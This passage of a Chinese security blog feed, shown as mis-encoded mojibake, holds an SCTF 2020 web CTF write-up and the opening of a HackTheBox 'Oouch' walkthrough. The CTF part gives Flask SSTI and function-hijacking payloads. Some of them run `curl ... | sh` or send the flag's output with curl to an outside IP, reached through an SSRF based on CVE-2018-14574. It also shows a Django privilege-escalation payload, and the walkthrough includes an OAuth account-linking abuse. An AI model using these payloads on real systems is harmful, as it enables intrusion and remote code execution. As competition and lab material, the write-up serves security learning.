alt></p><p>å¦‚æœæ˜¯å®˜æ–¹çš„æ€è·¯,è·Ÿæˆ‘ä¸€å¼€å§‹çš„æƒ³æ³•åº”è¯¥å·®ä¸å¤šã€‚é“ç†å°±æ˜¯å‡½æ•°åŠ«æŒã€‚å½“ç„¶å‰ææ˜¯èƒ½è·å–åˆ°å¯æ§å˜é‡çš„æ¨¡å—ã€‚å‡ºé¢˜äººæ‰¾çš„æ˜¯werkzeug.urls.url_parseã€‚è¿™é‡Œæˆ‘ä¹Ÿç”¨shrineå½“æ—¶çš„è„šæœ¬æ¥fuzzä¸‹ã€‚</p><p>search.py</p><pre><code class="python"># search.pydef search(obj, max_depth):    visited_clss = []    visited_objs = []    def visit(obj, path=&#39;obj&#39;, depth=0):        yield path, obj        if depth == max_depth:            return        elif isinstance(obj, (int, float, bool, str, bytes)):            return        elif isinstance(obj, type):            if obj in visited_clss:                return            visited_clss.append(obj)            print(obj)        else:            if obj in visited_objs:                return            visited_objs.append(obj)        # attributes        for name in dir(obj):            if name.startswith(&#39;__&#39;) and name.endswith(&#39;__&#39;):                if name not in  (&#39;__globals__&#39;, &#39;__class__&#39;, &#39;__self__&#39;,                                 &#39;__weakref__&#39;, &#39;__objclass__&#39;, &#39;__module__&#39;):                    continue            attr = getattr(obj, name)            yield from visit(attr, &#39;{}.{}&#39;.format(path, name), depth + 1)        # dict values        if hasattr(obj, &#39;items&#39;) and callable(obj.items):            try:                for k, v in obj.items():                    yield from visit(v, &#39;{}[{}]&#39;.format(path, repr(k)), depth)            except:                pass        # items        elif isinstance(obj, (set, list, tuple, frozenset)):            for i, v in enumerate(obj):                yield from visit(v, &#39;{}[{}]&#39;.format(path, repr(i)), depth)    yield from visit(obj)</code></pre><p>app.py</p><pre><code class="python">import flaskimport osfrom flask import requestfrom search import searchapp = flask.Flask(__name__)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    for path, obj in search(request, 10):        if str(obj)==&quot;werkzeug.urls&quot;:            return pathif __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>è¿™é‡Œå› ä¸ºè¦è·å–åˆ°<code>werkzeug.urls</code>è¿™ä¸ªç±»ã€‚æ‰€ä»¥æ”¹æˆ<code>if str(obj)==&quot;werkzeug.urls&quot;</code>ç„¶åå†æœ¬åœ°è·‘èµ·è¿™ä¸ªflask.è®¿é—®ä¸‹<code>/shrine/</code>è¿™ä¸ªè·¯ç”±+éšä¾¿ä»€ä¹ˆã€‚æ–¹ä¾¿å®ƒè·å–åˆ°requestã€‚è¿™æ ·å°±èƒ½è¿”å›ä¸€æ¡åˆ©ç”¨é“¾ã€‚<br><img src="/2020/07/05/SCTF2020-writeup/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><pre><code>app.__class__._get_current_object.__globals__[&#39;ClosingIterator&#39;].close.__globals__[&#39;uri_to_iri&#39;].__globals__[&#39;__name__&#39;]</code></pre><p>ç„¶åä¸èƒ½ç”¨å¼•å·å½“ç„¶åªèƒ½æ˜¯request.argsç»•è¿‡(è·Ÿä¸Šé¢ä¸€æ ·)ã€‚ä½¿ç”¨request.hostï¼Œrequest.headersä¹‹ç±»çš„æŠŠè¦ä¼ çš„å€¼æ”¾headeré‡Œå³å¯ã€‚åŠ«æŒurl_parse()è·å–å‡½æ•°eval()ã€‚ç„¶ååé¢url_parseå› ä¸ºç›´æ¥å¤„ç†è·¯ç”±ã€‚é‚£å°±å¯ä»¥ç›´æ¥è·¯ç”±ä¼ å‘½ä»¤RCEã€‚<br><code>__import__(&#39;os&#39;).system(&#39;curl$IFSxxxxx|sh&#39;)</code></p><p>é¢˜ç›®å…¶å®ä¸éš¾ï¼Œä½†æ˜¯è‡ªå·±åæ¥çœ‹éƒ½æ²¡çœ‹,è·‘å»çœ‹asisäº†ã€‚</p><h1 id="jsonhub"><a href="#jsonhub" class="headerlink" title="jsonhub"></a>jsonhub</h1><p>é¢˜ç›®å› ä¸ºweb1æ˜¯djangoçš„åŸå› ï¼Œå¯¼è‡´è‡ªå·±ç¬¬ä¸€æ­¥ä¸ç†Ÿæ‚‰è€Œç›´æ¥æ–­æ‰æ€è·¯ã€‚åé¢çš„ssrfä¸sstiåè€Œè¿˜æœ‰ç»éªŒ,åº”è¯¥å±äºè‡ªå·±ä¸ç†Ÿæ‚‰djangoçš„é—®é¢˜å§ã€‚</p><p>é¢˜ç›®å¼€å§‹çš„å‚æ•°æ³¨å…¥</p><pre><code>{&quot;username&quot;:&quot;byc_401&quot;,&quot;password&quot;:&quot;123&quot;,&quot;is_staff&quot;:1,&quot;is_superuser&quot;:1}</code></pre><p>ä½¿ç”¨è¿™ä¸¤ä¸ªå­—æ®µåº”è¯¥æ˜¯å› ä¸ºUseræ¨¡å‹çš„ç¼˜æ•…ã€‚å±äºdjangoé»˜è®¤çš„ä¸¤ä¸ªåˆ—åã€‚<br>åå°ç™»å½•åæ‹¿åˆ°token<br><img src="/2020/07/05/SCTF2020-writeup/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥æ˜¯æºç ä¸­ä¸€ä¸ªéœ€è¦åˆ©ç”¨cveç»•è¿‡çš„éƒ¨åˆ†ã€‚</p><pre><code class="python">white_list = [&quot;39.104.19.182&quot;]def ssrf_check(url ,white_list):    for i in range(len(white_list)):        if url.startswith(&quot;http://&quot; + white_list[i] + &quot;/&quot;):            return Falsedef flask_rpc(request):    if request.META[&#39;REMOTE_ADDR&#39;] != &quot;127.0.0.1&quot;:        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Must 127.0.0.1&quot;})</code></pre><p>å› ä¸ºåœ¨web2å­˜åœ¨æ˜æ˜¾çš„ssti,æˆ‘ä»¬æƒ³è¦è¾¾æˆsstiå¿…é¡»è¦åœ¨è¿™å¾€127.0.0.1è·‘åœ¨8000çš„flaskæ‰“ä¸€å‘ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬åˆ©ç”¨CVE-2018-14574è¿™ä¸ªä»»æ„urlè·³è½¬ï¼Œå³å¯ssrf.</p><pre><code class="http">http://39.104.19.182//127%2e0.0.1:8000/rpc?methods=POST&amp;data=eyJudW0xIjoiIiwibnVtMiI6IiIsInN5bWJvbHMiOiJ7XHUwMDdiJzEnLl9fY2xhc3NfXy5tcm8oKVstMV0uX19zdWJjbGFzc2VzX18oKVs2NF0uX19pbml0X18uX19nbG9iYWxzX19bJ19fYnVpbHRpbnNfXyddWydldmFsJ10oXCJfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY3VybCAxMjAuMjcuMjQ2LjIwMi9gL3JlYWRmbGFnYCAnKVwiKX1cdTAwN2QifQ==</code></pre><p>åé¢æ‰“flaskçš„payloadä¸»è¦æ˜¯è§£å†³å¤§æ‹¬å·çš„é—®é¢˜ã€‚å› ä¸ºå®ƒæ˜¯é€šè¿‡get_jsonè·å–æ•°æ®çš„,å› æ­¤å…¶å®å¹¶ä¸å­˜åœ¨wafçš„é—®é¢˜ã€‚åªè¦ç”¨unicodeç»•è¿‡å³å¯ã€‚è¿™ç‚¹åœ¨Node.jsè·Ÿphpçš„json_decode()ç»•è¿‡æ—¶åº”è¯¥ç»å¸¸ç”¨åˆ°ã€‚</p><p>å¹¶ä¸”ï¼Œç”±äºweb2è·å–çš„å‚æ•°è¦æ±‚num1,2ä¸èƒ½æœ‰å°å†™å­—æ¯ã€‚symbolså¿…é¡»èƒ½åŒ¹é…åˆ°<code>+\-*/</code>ä¹‹ä¸€ã€‚è¿™ä¸ªpayloadä¹Ÿç›´æ¥ç»•è¿‡äº†waf.</p><pre><code class="json">{&quot;num1&quot;:&quot;&quot;,&quot;num2&quot;:&quot;&quot;,&quot;symbols&quot;:&quot;{\u007b [].__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](\&quot;__import__(&#39;os&#39;).system(&#39;curl xxxx/`/readflag` &#39;)\&quot;)}\u007d&quot;}</code></pre><p>è¿˜å¯ä»¥ç”¨<code>num1={</code>,<code>symbols={PAYLOAD}</code>,num2=<code>}</code>æ¥è§£å†³é—®é¢˜ã€‚è‡³äºflaskè·å–åˆ°å«catch_warningsæ¨¡ç»„è¿›è€Œè·å–åˆ°evalçš„æ–¹æ³•ä¹Ÿæ˜¯è€ç”Ÿå¸¸è°ˆã€‚FUZZä¸‹å°±å¥½äº†ã€‚</p><p><img src="/2020/07/05/SCTF2020-writeup/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥è‡ªå·±ä¸»è¦æ˜¯å› ä¸ºdjangoå¤ªè¿‡é™Œç”Ÿ,å¯¼è‡´æ²¡èƒ½ä¸‹æ‰‹,è·‘å»çœ‹asisäº†ã€‚å‰©ä¸‹çš„éš¾åº¦å…¶å®è¿˜å¥½ã€‚</p><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><p>æš‚æ—¶å…ˆæŠŠwpæ”¾è¿™äº›å§ã€‚äº‰å–æ˜å¤©è‡ªå·±å†å¤šå¤ç°ä¸‹json_hubã€‚å› ä¸ºåˆšå¥½æŠŠhtbçš„travelåšå®Œäº†ï¼Œç®—æ˜¯äº†å´å¿ƒå¤´ä¸€ä»¶äº‹ã€‚åº”è¯¥èƒ½æŠ½ç©ºåšäº›å¤ç°å­¦ä¹ äº†ã€‚</p><p>å…³äºæœ€è¿‘çš„æ¯”èµ›å¿ƒé‡Œå…¶å®ä¸€ç›´æœ‰ç‚¹éš¾å—ã€‚æˆ˜é˜Ÿå·²ç»å¼€å§‹æ¢å±Šäº†,webæ–°ä¸€å±Šçš„å­¦å¼Ÿè¿˜æ²¡ä¸Šæ¥ï¼Œä½†æ˜¯å¹³æ—¶åœ¨æ‰“æ¯”èµ›çš„webæ‰‹å·²ç»å‡ ä¹å°±åªæœ‰æˆ‘è·Ÿzjyäº†ã€‚æ¯æ¬¡xctfæ‰“åˆ°ä¸€åŠæ€»æ„Ÿè§‰å½¢å•å½±åª,ç›¸æ¯”äººå°‘è€Œè¨€æ›´å¤šçš„æ˜¯æ„Ÿæ…¨è‡ªå·±tclã€‚æ¯æ¬¡éƒ½ä¼šé‡åˆ°æ„Ÿè§‰è‡ªå·±æ€ä¹ˆæ²¡æ—©ç‚¹å­¦çš„çŸ¥è¯†ã€‚å¿ƒé‡Œè¿‡æ„ä¸å»ã€‚</p><p>ä¸è¿‡æ¯•ç«Ÿæ‰“æ¯”èµ›æ˜¯å­¦ä¹ çš„è¿‡ç¨‹,æ¯æ¬¡æ¯”èµ›ç¡®å®éƒ½èƒ½æ¥è§¦åˆ°æ–°å§¿åŠ¿ä»¥åŠåæ€ä¸‹è‡ªå·±çš„ä¸è¶³ã€‚ç°åœ¨æ—¢ç„¶åˆ°æš‘å‡äº†ï¼Œæ˜¯æ—¶å€™å¥½å¥½ç³»ç»Ÿå­¦ä¹ ä¸‹æ–°çŸ¥è¯†ï¼š<br>1.php: ä¸€ä¸ªæ˜¯phpauditlabsäº‰å–æ¯æ¬¡éƒ½å®¡ä¸€é;ç„¶ålaravelè·Ÿtpè¿™æ ·çš„æ¡†æ¶è¿‡ä¸€ä¸‹ã€‚å…¶å®wordpressä¹Ÿå¯ä»¥æ¥è§¦ä¸‹ï¼Œæ­£å¥½æœ€è¿‘ç¢°åˆ°äº†ã€‚<br>2.hackthebox: ä¸ç”¨åšé‚£ä¹ˆæ€¥,ç°å½¹é¶æœºå‰©ä¸‹æ²¡åšçš„åŸºæœ¬ä¸Šéƒ½æ˜¯hardåŠä»¥ä¸Šéš¾åº¦äº†ã€‚å¯ä»¥æ…¢æ…¢æ¥ã€‚<br>3.java: å‡ ä¹ä»é›¶å¼€å§‹çš„javaå­¦ä¹ (æˆ‘è‡ªå·±çˆ¬)<br>4.python: djangoçš„è®¤è¯†å­¦ä¹ <br>5.Nodejs: ä¿æŒç°çŠ¶ã€‚å¤šç»ƒæ‰‹ä¸‹Nodejsçš„å¼€å‘</p><p>å·®ä¸å¤šå°±è¿™æ ·äº†ã€‚äº‰å–å‡æœŸæœŸé—´å¤šæ›´ä¸‹æ–‡ç« æ€»ç»“çŸ¥è¯†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Oouch</title>
      <link href="2020/07/01/hackthebox-Oouch/"/>
      <url>2020/07/01/hackthebox-Oouch/</url>
      
        <content type="html"><![CDATA[<p>Oouché¶æœºçš„éš¾åº¦ç›¸æ¯”æœ€è¿‘åšå®Œçš„ä¸¤ä¸ªhard machine Quickè·ŸForwardslashè€Œè¨€æœ‰è¿‡ä¹‹è€Œæ— ä¸åŠã€‚ç”šè‡³äºæ„Ÿè§‰å¯èƒ½æ¥è¿‘åˆ°Insaneéš¾åº¦äº†ã€‚ä»webç•Œé¢ä¸‹æ‰‹æ—¶é‡åˆ°å¾ˆå¤šä¸ç¨³å®šçš„é—®é¢˜ï¼Œè€Œä¹‹åä»userææƒåˆ°rootæ›´æ˜¯å‡ºç°ç„å­¦é—®é¢˜ï¼Œä¸€æ¨¡ä¸€æ ·çš„çš„payloadå¤´ä¸€å¤©å¤±è´¥ç¬¬äºŒå¤©å°±æˆäº†ã€‚ä½†æ˜¯æ€»å½’å­¦åˆ°äº†ä¸å°‘æ–°çŸ¥è¯†ï¼Œæ‰€ä»¥èµ¶ç´§æ€»ç»“ä¸‹ã€‚</p><a id="more"></a><p><img src="/2020/07/01/hackthebox-Oouch/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>é¶æœºip: 10.10.10.186</li><li>æ”»å‡»æœº: 10.10.14.40</li></ul><h2 id="initial-foothold-to-user"><a href="#initial-foothold-to-user" class="headerlink" title="initial foothold to user"></a>initial foothold to user</h2><ul><li>nmap </li></ul><pre><code class="bash"># Nmap 7.80 scan initiated Sun Jun 28 15:53:13 2020 as: nmap -sC -sV -oA nmap/oouch 10.10.10.177WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second valueNmap scan report for 10.10.10.177Host is up (0.43s latency).Not shown: 996 closed portsPORT     STATE SERVICE VERSION21/tcp   open  ftp     vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt| ftp-syst: |   STAT: | FTP server status:|      Connected to 10.10.14.46|      Logged in as ftp|      TYPE: ASCII|      Session bandwidth limit in byte/s is 30000|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      At session startup, client count was 3|      vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: |   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)5000/tcp open  http    nginx 1.14.2|_http-server-header: nginx/1.14.2| http-title: Welcome to Oouch|_Requested resource was http://10.10.10.177:5000/login?next=%2F8000/tcp open  rtsp| fingerprint-strings: |   FourOhFourRequest, GetRequest, HTTPOptions: |     HTTP/1.0 400 Bad Request|     Content-Type: text/html|     Vary: Authorization|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;|   RTSPRequest: |     RTSP/1.0 400 Bad Request|     Content-Type: text/html|     Vary: Authorization|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;|   SIPOptions: |     SIP/2.0 400 Bad Request|     Content-Type: text/html|     Vary: Authorization|_    &lt;h1&gt;Bad Request (400)&lt;/h1&gt;|_http-title: Site doesn&#39;t have a title (text/html).|_rtsp-methods: ERROR: Script execution failed (use -d to debug)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8000-TCP:V=7.80%I=7%D=6/28%Time=5EF84CE8%P=x86_64-pc-linux-gnu%r(GeSF:tRequest,64,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20texSF:t/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/SF:h1&gt;&quot;)%r(FourOhFourRequest,64,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nConSF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20ReqSF:uest\x20\(400\)&lt;/h1&gt;&quot;)%r(HTTPOptions,64,&quot;HTTP/1\.0\x20400\x20Bad\x20ReqSF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1SF:&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;&quot;)%r(RTSPRequest,64,&quot;RTSP/1\.0\x20400\x2SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20AuthorizationSF:\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;&quot;)%r(SIPOptions,63,&quot;SIP/2\.0\SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20AuthSF:orization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Jun 28 15:55:59 2020 -- 1 IP address (1 host up) scanned in 166.01 seconds</code></pre><p>21,22,5000,8000 ç«¯å£å¼€æ”¾ã€‚å¹¶ä¸”21ç«¯å£ftpå¯ä»¥åŒ¿åç™»å½•ã€‚</p><ul><li>ftp annoymous login</li></ul><p>ftpåŒ¿åç™»å½•æä¸‹æ¥ä¸€ä¸ªproject.txt<br>get file project.txt</p><pre><code>Flask -&gt; ConsumerDjango -&gt; Authorization Server</code></pre><p>æŒ‰ç…§nmapçš„ç»“æœï¼Œ5000è·Ÿ8000æœ‰ä¸¤ä¸ªwebæœåŠ¡ï¼Œçœ‹èµ·æ¥ä¼¼ä¹æ˜¯flaskè·Ÿdjango.</p><ul><li>enumeration</li></ul><p>æ­¤æ—¶ä»5000ç«¯å£çš„æœåŠ¡å…¥æ‰‹ã€‚é¦–å…ˆæ³¨å†Œç™»å½•åå‘ç°æä¾›äº†å‡ ä¸ªæ¯”è¾ƒæ²¡ç”¨çš„åŠŸèƒ½ï¼Œå…¶ä¸­<code>/document</code>è·¯ç”±çš„å†…å®¹æç¤ºåªæœ‰adminèƒ½ç”¨ã€‚<code>/profile</code>æ˜¾ç¤ºæˆ‘ä»¬å¯ä»¥é“¾æ¥è´¦æˆ·ï¼Œä½†æ˜¯ä¸çŸ¥é“è¦æ€ä¹ˆåšã€‚<code>/contact</code>å¤„ä¼¼ä¹å¯ä»¥è®©adminæ¥å—æˆ‘ä»¬çš„urlç„¶åé€ æˆssrf.ä½†æ˜¯è¿™äº›éƒ½è¿˜æ²¡æœ‰å¯å…·ä½“ä¸‹æ‰‹çš„åœ°æ–¹ã€‚</p><p>è€Œ8000ç«¯å£çš„æœåŠ¡ç›´æ¥è®¿é—®è¿”å›400.ä¼¼ä¹åˆ°è¿™ä¸€æ­¥å°±å¡ä½äº†ã€‚</p><p>äºæ˜¯å°è¯•çˆ†ç ´è·¯ç”±ï¼Œæœ‰äº†æ„å¤–çš„æ”¶è·ã€‚</p><pre><code class="bash">wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u &#39;http://10.10.10.177:5000/FUZZ&#39; --hc 404 -t 70</code></pre><pre><code class="bash">********************************************************* Wfuzz 2.4.5 - The Web Fuzzer                         *********************************************************Target: http://10.10.10.177:5000/FUZZTotal requests: 4614===================================================================ID           Response   Lines    Word     Chars       Payload                                                                                                                    ===================================================================000000223:   302        3 L      24 W     247 Ch      &quot;about&quot;000000001:   302        3 L      24 W     237 Ch      &quot;&quot;                                                                        000001013:   302        3 L      24 W     251 Ch      &quot;contact&quot;                                                                         000001325:   302        3 L      24 W     255 Ch      &quot;documents&quot;                                                                        000001908:   302        3 L      24 W     245 Ch      &quot;home&quot;                                                                               000002347:   200        54 L     110 W    1828 Ch     &quot;login&quot;                                                                               000002362:   302        3 L      24 W     219 Ch      &quot;logout&quot;                                                                             000002722:   302        3 L      24 W     247 Ch      &quot;oauth&quot;                                                                               000003160:   302        3 L      24 W     251 Ch      &quot;profile&quot;                                                                           000003341:   200        63 L     124 W    2109 Ch     &quot;register&quot;                                                                           </code></pre><p>é™¤äº†ä¹‹å‰å‡ ä¸ªåŠŸèƒ½å¤–è¿˜æœ‰<code>oauth</code>ã€‚(è¿™é‡Œæ˜¯æ¢äº†ä¸ªå¹³æ—¶ä¸ç”¨çš„dirbè¯å…¸çˆ†å‡ºæ¥çš„ï¼Œè™½ç„¶å†…å®¹å°‘ä½†æœ‰æ—¶æ°å¥½å°±èƒ½å¾—åˆ°æƒ³è¦çš„ä¿¡æ¯)</p><p>è®¿é—®oauth<br><img src="/2020/07/01/hackthebox-Oouch/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¾—åˆ°äº†5000ç«¯å£ä¸8000ç«¯å£çš„å…·ä½“åŸŸåã€‚äºæ˜¯åŠ åˆ°<code>/etc/hosts</code>ä¸­ã€‚</p><p>å†æ¥ç€å°è¯•äº†ä¸¤ä¸ªé“¾æ¥å,æˆ‘å‘ç°å¤§æ¦‚å®ç°äº†ä¸€ä¸ªauthorizeçš„è¿‡ç¨‹ã€‚åŠ ä¸Šoauthçš„è¿™ä¸ªåè¯ï¼Œæˆ‘å†³å®šå…ˆå»googleä¸€ä¸‹ï¼Œäºæ˜¯å¤§è‡´èƒ½å¤Ÿç†è§£ï¼Œè¿™æ˜¯ä¸€ä¸ªå®ç°äº†<code>oauth2</code>åŠŸèƒ½çš„åœºæ™¯ã€‚</p><p>oauthçš„æµç¨‹æ˜¯è¿™æ ·çš„</p><blockquote><p>1.The application requests authorization to access service resources from the user. The application needs to provide the client ID, client secret, redirect URI and the required scopes.<br>2.If the user authorizes the request, the application receives an authorization grant<br>3.The application ** requests an access token from the authorization server ** by presenting authentication of its own identity, and the authorization grant<br>4.If the application identity is authenticated and the authorization grant is valid, the authorization server issues the access and refresh (if required) token to the application. Authorization is complete.<br>5.The application requests the resource from the resource server and presents the access token for authentication<br>6.If the access token is valid, the resource server serves the resource to the application</p></blockquote><p>æŒ‰ç…§é˜®ä¸€å³°è€å¸ˆçš„ç†è§£ï¼Œå°±æ˜¯åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡å•†ä¹‹é—´åŠ ä¸Šäº†ä¸€ä¸ªæˆæƒå±‚ï¼Œè¿™é‡Œå…·ä½“è€Œè¨€ï¼Œå°±æ˜¯æˆ‘ä»¬åœ¨æˆæƒåï¼Œå¯ä»¥è®©8000ç«¯å£çš„è´¦å·è·Ÿ5000çš„è´¦å·ç»‘å®šåœ¨ä¸€èµ·ã€‚æ¯æ¬¡è¿›è¡Œæ“ä½œæ—¶éƒ½ä¼šæœ‰è¿™æ ·çš„ä¸­é—´é¡µé¢<br><img src="/2020/07/01/hackthebox-Oouch/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ ¹æ®<code>consumer</code>é‡Œ<code>oauth</code>çš„è¦æ±‚ã€‚æˆ‘ä»¬åº”è¯¥å…ˆå»<code>oauth/connect</code>,ç„¶åå½“æˆ‘ä»¬åœ¨<code>authorization</code>é‡Œæ³¨å†Œå®Œè´¦å·åï¼Œè®¿é—®<code>oauth/login</code>å°±å®Œæˆäº†è´¦å·çš„å…³è”ã€‚</p><p>è€Œè¿™é‡Œå°±äº§ç”Ÿäº†ä¸€ä¸ªæå‡æƒé™çš„å¯èƒ½ã€‚oauthçš„ç‰¹ç‚¹åœ¨äºï¼Œæˆ‘ä»¬è®¿é—®<code>oauth/login</code>è¿›è¡Œè´¦å·å…³è”æ—¶ï¼Œä¸­é—´å±‚æ˜¯æ ¹æ®æˆ‘ä»¬ä¹‹å‰connectæ—¶ä¼ è¾“çš„tokenè¿›è¡Œç›®æ ‡åˆ¤å®šçš„(å…·ä½“æŠ“åŒ…äº†è§£)ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä»¥adminçš„èº«ä»½ä¼ ä¸€ä¸ªæœ‰æ•ˆtokenï¼Œä¹‹åè¿æ¥è´¦å·æ—¶å°±ä¼šæŠŠæˆ‘ä»¬åœ¨<code>authorization</code>çš„è´¦å·ä¸<code>consumer</code>å¤„adminçš„è´¦å·ç›¸å…³è”ã€‚<br>è¿™æ˜¯æ¯ä¸€æ¬¡è¿›è¡Œconnectæ—¶,æˆ‘ä»¬å®¢æˆ·ç«¯ä¼šå‘å‘çš„ä¸€ä¸ªå«æœ‰tokençš„åŒ…<br><img src="/2020/07/01/hackthebox-Oouch/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™æ—¶ä¹‹å‰æåˆ°çš„<code>/contact</code>å°±æ´¾ä¸Šç”¨åœºäº†ã€‚æˆ‘ä»¬burpæŠ“åŒ…å¹¶æŠŠè¿™ä¸ªä¼ è¾“<code>token</code>çš„åŒ…dropæ‰ã€‚è½¬è€Œåˆ©ç”¨adminçš„contactå®Œæˆè¿™æ¬¡tokenå‘é€ã€‚æ¥ä¸‹æ¥å†æ¬¡ç‚¹å‡»<code>oauth/login</code>ï¼Œå°±èƒ½è§¦å‘è¿æ¥,ç»‘å®šadminè´¦æˆ·ã€‚<br><img src="/2020/07/01/hackthebox-Oouch/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç°åœ¨æˆ‘ä»¬å·²ç»ç»‘å®šqtcè´¦æˆ·äº†ã€‚å¹¶ä¸”åœ¨documentå¤„å‘ç°æç¤º<br><img src="/2020/07/01/hackthebox-Oouch/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>ä¸€ä¸ªè´¦å·ã€‚åŠŸèƒ½æ˜¯application 